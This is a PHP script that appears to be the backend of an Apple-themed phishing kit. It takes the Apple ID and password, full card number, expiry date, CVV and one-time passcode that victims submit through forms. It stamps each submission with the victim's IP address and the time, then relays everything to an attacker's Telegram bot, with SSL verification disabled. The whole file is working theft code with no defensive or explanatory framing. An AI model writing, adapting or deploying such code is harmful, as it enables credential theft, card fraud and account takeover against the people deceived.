<?php

require '../config.php';



function send($msg){
	global $bot_token;
	global $chat_id;
	$api = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$msg";
	$c = curl_init();
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_URL, $api);
	return curl_exec($c);
	curl_close($c);
}

$info = "\nTIME: ".date("d-m-Y h:i:sa")."\n[ ---- ".$_SERVER['REMOTE_ADDR']." ---- ]";

if(isset($_POST['id'])){
	$msg = urlencode("[ +❤️✉️✉️ APPLE LOGIN ✉️✉️❤️+ ]\nID : ".$_POST['id']."\nPASSWORD : ".$_POST['pass'].$info);
	send($msg);
}


if(isset($_POST['cardnumber'])){
	$msg = urlencode("[ +❤️✉️✉️ APPLE CARD ✉️✉️❤️+ ]\nFULL NAME : ".$_POST['fullname']."\nCARD NUMBER: ".$_POST['cardnumber']."\nEXP : ".$_POST['exp']."\nCVV : ".$_POST['cvv'].$info);
	send($msg);
}

if(isset($_POST['otp'])){
	$msg = urlencode("[ +❤️✉️✉️ APPLE OTP ✉️✉️❤️+ ]\nOTP : ".$_POST['otp'].$info);
	send($msg);
}



?>